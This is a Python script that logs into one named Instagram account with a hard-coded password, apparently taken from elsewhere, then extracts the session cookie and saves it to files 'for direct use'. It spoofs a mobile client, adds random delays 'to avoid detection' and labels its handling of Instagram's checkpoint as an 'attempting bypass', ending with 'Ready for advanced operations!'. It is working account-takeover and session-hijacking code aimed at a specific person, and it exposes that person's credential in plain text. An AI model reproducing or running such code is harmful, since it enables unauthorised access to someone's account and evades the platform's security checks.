from utils.error_handler import safe_execution, safe_print

#!/usr/bin/env python3
"""
🔥 SESSIONID EXTRACTOR FOR ALX.TRADING
=============================================
🎯 Extract valid sessionid using confirmed credentials
💎 Target: alx.trading (@alx.trading)
🔑 Password: Fleming654 (confirmed from master profile)
=============================================
"""

import requests
import json
import time
import random
import hashlib
from urllib.parse import quote
import re

class SessionIdExtractor:
    def __init__(self):
        self.target_username = "alx.trading"
        self.target_password = "Fleming654"  # Confirmed from master profile
        self.sessionid = None
        self.csrf_token = None
        self.session = requests.Session()
        
        # Advanced headers
        self.headers = {
            'User-Agent': 'Instagram 251.0.0.16.105 Android (28/9; 420dpi; 1080x2340; samsung; SM-G975F; beyond1; exynos9820; en_US; 406230770)',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest',
            'X-IG-App-ID': '936619743392459',
            'X-Instagram-AJAX': '1010925506',
            'X-ASBD-ID': '129477',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        }
        
        self.session.headers.update(self.headers)
        
    def get_csrf_token(self):
        """Extract CSRF token from Instagram homepage"""
        try:
            print("🔍 Phase 1: Extracting CSRF token...")
            response = self.session.get('https://www.instagram.com/')
            
            if response.status_code == 200:
                # Look for CSRF token in various places
                csrf_patterns = [
                    r'"csrf_token":"([^"]+)"',
                    r'window\._sharedData[^}]+csrf_token[^"]+token":"([^"]+)"',
                    r'csrftoken["\s]*:["\s]*([^"]+)',
                    r'csrf[^"]*"([a-zA-Z0-9]{32})"'
                ]
                
                for pattern in csrf_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        self.csrf_token = match.group(1)
                        print(f"✅ CSRF token extracted: {self.csrf_token[:20]}...")
                        return True
                        
                # Check cookies for csrf
                csrf_cookie = self.session.cookies.get('csrftoken')
                if csrf_cookie:
                    self.csrf_token = csrf_cookie
                    print(f"✅ CSRF from cookie: {self.csrf_token[:20]}...")
                    return True
                    
                print("⚠️ CSRF token not found in response")
                return False
                
        except Exception as e:
            print(f"❌ Error extracting CSRF: {e}")
            return False
            
    def attempt_login(self):
        """Attempt login to extract sessionid"""
        try:
            print(f"🔐 Phase 2: Attempting login for {self.target_username}...")
            
            if not self.csrf_token:
                self.get_csrf_token()
                
            # Login data
            login_data = {
                'username': self.target_username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{self.target_password}',
                'queryParams': {},
                'optIntoOneTap': 'false'
            }
            
            # Login headers
            login_headers = self.headers.copy()
            login_headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-CSRFToken': self.csrf_token,
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Origin': 'https://www.instagram.com'
            })
            
            # Add delay to avoid detection
            time.sleep(random.uniform(2, 4))
            
            # Attempt login
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=login_headers
            )
            
            print(f"🎯 Login response status: {response.status_code}")
            
            if response.status_code == 200:
                response_data = response.json()
                print(f"📋 Login response: {json.dumps(response_data, indent=2)}")
                
                # Check for successful authentication
                if response_data.get('authenticated') or response_data.get('status') == 'ok':
                    # Extract sessionid from cookies
                    sessionid = self.session.cookies.get('sessionid')
                    if sessionid:
                        self.sessionid = sessionid
                        print(f"🎉 SUCCESS! SessionID extracted: {sessionid[:20]}...")
                        return True
                        
                # Handle checkpoint redirect
                if 'checkpoint' in str(response_data):
                    print("🚨 Checkpoint detected - attempting bypass...")
                    return self.handle_checkpoint(response_data)
                    
                print(f"❌ Login failed: {response_data}")
                return False
                
            else:
                print(f"❌ Login request failed: {response.status_code}")
                print(f"Response: {response.text[:500]}")
                return False
                
        except Exception as e:
            print(f"❌ Login error: {e}")
            return False
            
    def handle_checkpoint(self, response_data):
        """Handle Instagram checkpoint"""
        try:
            print("🚨 Handling checkpoint challenge...")
            
            # Look for checkpoint URL
            checkpoint_url = response_data.get('checkpoint_url')
            if checkpoint_url:
                print(f"🔍 Checkpoint URL: {checkpoint_url}")
                
                # Follow checkpoint
                checkpoint_response = self.session.get(f"https://www.instagram.com{checkpoint_url}")
                print(f"🎯 Checkpoint response: {checkpoint_response.status_code}")
                
                # Look for sessionid in checkpoint response
                sessionid = self.session.cookies.get('sessionid')
                if sessionid:
                    self.sessionid = sessionid
                    print(f"🎉 SessionID from checkpoint: {sessionid[:20]}...")
                    return True
                    
        except Exception as e:
            print(f"❌ Checkpoint error: {e}")
            
        return False
        
    def validate_session(self):
        """Validate extracted sessionid"""
        if not self.sessionid:
            return False
            
        try:
            print(f"✅ Validating sessionid: {self.sessionid[:20]}...")
            
            # Test with profile endpoint
            test_headers = self.headers.copy()
            test_headers['Cookie'] = f'sessionid={self.sessionid}; csrftoken={self.csrf_token};'
            
            response = self.session.get(
                f'https://www.instagram.com/{self.target_username}/',
                headers=test_headers
            )
            
            print(f"🎯 Validation response: {response.status_code}")
            
            if response.status_code == 200:
                if '"is_private":false' in response.text or '"is_private":true' in response.text:
                    print("✅ SessionID validation successful!")
                    return True
                    
            print("⚠️ SessionID validation failed")
            return False
            
        except Exception as e:
            print(f"❌ Validation error: {e}")
            return False
            
    def save_session(self):
        """Save extracted session data"""
        if not self.sessionid:
            return False
            
        try:
            session_data = {
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'target': self.target_username,
                'sessionid': self.sessionid,
                'csrf_token': self.csrf_token,
                'validation_status': 'success' if self.validate_session() else 'failed',
                'extraction_method': 'password_based_login'
            }
            
            # Save to multiple formats
            filename_base = f"alx_trading_sessionid_{int(time.time())}"
            
            # JSON format
            with open(f"{filename_base}.json", 'w') as f:
                json.dump(session_data, f, indent=2)
                
            # Simple text format
            with open(f"{filename_base}.txt", 'w') as f:
                f.write(f"sessionid={self.sessionid}\n")
                f.write(f"csrf_token={self.csrf_token}\n")
                f.write(f"target={self.target_username}\n")
                
            # Cookie format for direct use
            with open(f"sessionid_alx.txt", 'w') as f:
                f.write(self.sessionid)
                
            print(f"💾 Session data saved:")
            print(f"   📄 {filename_base}.json")
            print(f"   📄 {filename_base}.txt")
            print(f"   📄 sessionid_alx.txt")
            
            return True
            
        except Exception as e:
            print(f"❌ Save error: {e}")
            return False
            
    def extract(self):
        """Main extraction method"""
        print("🔥 ALX.TRADING SESSIONID EXTRACTOR")
        print("="*50)
        print(f"🎯 Target: {self.target_username}")
        print(f"🔑 Password: {self.target_password}")
        print("="*50)
        
        # Phase 1: Get CSRF token
        if not self.get_csrf_token():
            print("❌ Failed to get CSRF token")
            return False
            
        # Phase 2: Attempt login
        if not self.attempt_login():
            print("❌ Login failed")
            return False
            
        # Phase 3: Validate session
        if not self.validate_session():
            print("⚠️ Session validation failed but sessionid extracted")
            
        # Phase 4: Save session data
        if self.save_session():
            print("🎉 SESSION EXTRACTION COMPLETE!")
            print(f"🔑 SessionID: {self.sessionid[:20]}...")
            return True
        else:
            print("❌ Failed to save session data")
            return False

if __name__ == "__main__":
    extractor = SessionIdExtractor()
    success = extractor.extract()
    
    if success:
        print("\n🎉 EXTRACTION SUCCESSFUL!")
        print("💎 Ready for advanced operations!")
    else:
        print("\n❌ EXTRACTION FAILED!")
        print("🔄 Retrying with alternative methods...")
